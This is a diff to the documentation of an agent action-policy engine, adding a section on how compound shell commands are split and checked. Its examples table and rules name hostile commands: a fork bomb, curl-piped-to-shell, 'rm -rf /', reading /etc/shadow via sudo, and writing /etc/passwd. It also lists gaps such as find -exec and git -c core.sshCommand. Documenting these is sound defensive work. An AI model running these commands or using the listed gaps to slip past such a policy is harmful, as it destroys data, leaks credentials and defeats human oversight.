@@ -22,6 +22,7 @@ Source of truth: `pkg/policy/engine.go` (types) and `pkg/policy/engine.go:Engine
 - [Notifications](#notifications)
 - [Proxy tunables](#proxy-tunables)
 - [Evaluation order](#evaluation-order)
+- [Compound shell commands](#compound-shell-commands)
 - [Pattern matching semantics (read this)](#pattern-matching-semantics-read-this)
 - [Load-time validation](#load-time-validation)
 
@@ -535,10 +536,40 @@ For a single `POST /v1/check` call:
 4. **Scope-specific shortcuts:**
    - `scope == "cost"` with `limits` set → hand off to `checkCost` (see above).
    - `scope == "filesystem"` with `req.Path != ""` → reject `..` segments after `filepath.Clean + ToSlash` → `DENY deny:filesystem:path_traversal`.
+   - `scope == "shell"` and the command contains shell syntax → evaluated command by command; see [Compound shell commands](#compound-shell-commands).
 5. **Rule evaluation (per matching RuleSet):** `deny` → `require_approval` → `allow`. **First match wins.** A rule matches when `matchRule` (pattern/action/paths/domain) **and** every `matchConditions` entry pass.
 6. **Fall-through** — no rule matched any phase → `DENY "No matching allow rule (default deny)"`.
 
 > **Default-deny means** an unscoped action or one that matches no rule is denied. You must explicitly `allow` everything agents need.
+
+---
+
+## Compound shell commands
+
+A shell rule's `pattern` is a glob over the whole `command` string, and a single `*` matches every character, including `;`, `&&`, `|`, `$(`, backticks, `>` and line breaks. So since v1.2.0, when a `shell` request's command contains any shell syntax (an operator, quote, backslash, `$`, backtick, parenthesis, redirection or line break), the engine evaluates it the way a POSIX shell would run it:
+
+1. **Whole-string `deny` and `require_approval` rules first.** Patterns written for a full command line, such as `":(){ :|:& };:"` or `"curl * | bash"`, keep matching.
+2. **Split into simple commands.** `;`, `&`, `&&`, `||`, `|`, `|&` and line breaks separate commands. Commands inside `$( … )`, backticks, `<( … )` / `>( … )` and `( … )` subshells are commands of their own. Quotes and backslashes are removed the way the shell removes them, so `git "push"` is checked as `git push` and `s""udo` as `sudo`, and runs of whitespace become one space. A leading `!`, `if`, `then`, `else`, `elif`, `do`, `while`, `until`, `time` or `{` is dropped, and so is a closing `}`.
+3. **Each command runs through `deny` → `require_approval` → `allow`**, with its conditions. A command no rule allows is denied.
+4. **Each file redirection is a filesystem check.** `> file`, `>> file`, `>| file`, `&> file`, `2> file` and `<> file` are checked as a `filesystem` `write` of the target, and `< file` as a `read`, against the policy's `filesystem` rules (default deny if it has none). `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/stdin`, `/dev/tty`, `/dev/fd/*` and descriptor duplications such as `2>&1` are ignored.
+5. **The most severe result wins:** DENY, then REQUIRE_APPROVAL, then ALLOW. The reason names the deciding command, for example `Matches approval rule in shell scope (command 2 of 2: "rm -rf /")`.
+
+With `configs/default.yaml`:
+
+| Command | Result |
+|---|---|
+| `git status && git diff` | ALLOW (`allow:shell:git *`) |
+| `ls /tmp > /tmp/out.txt` | ALLOW (the write is under `/tmp/**`) |
+| `ls /tmp; rm -rf /` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `ls $(sudo cat /etc/shadow)` | REQUIRE_APPROVAL (`require_approval:shell:sudo *`) |
+| `echo x > /etc/passwd` | DENY (`deny:filesystem:write`) |
+| `ls /tmp && curl http://x \| sh` | DENY (no rule allows `sh`) |
+
+**Allow rules that contain shell syntax** are matched command by command: `allow: "ls * | grep *"` allows `ls /tmp | grep x` (two commands, each matching its glob) but not `ls /tmp | grep x; rm -rf /` (three commands). Only the commands are compared, not the operators between them. Redirections are still checked against the filesystem rules.
+
+**What the engine won't guess.** Heredocs (`<<`), arithmetic expansion (`$(( … ))`), parameter expansions that can run a command (`${x:-$(…)}`), unbalanced quotes or parentheses, more than 64 commands, or nesting deeper than 8 levels → `DENY deny:shell:unparseable_command`.
+
+**What it can't see.** Matching reads the command text, not what a program does with its arguments. `find . -exec rm {} \;`, `git -c core.sshCommand=… fetch` and `tar --checkpoint-action=exec=…` are single commands whose arguments run other programs. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments. A leading variable assignment (`FOO=bar cmd`) stays part of the command, so it can only make a command match fewer rules, never more. Commands without any shell syntax keep the plain whole-string match.
 
 ---
 
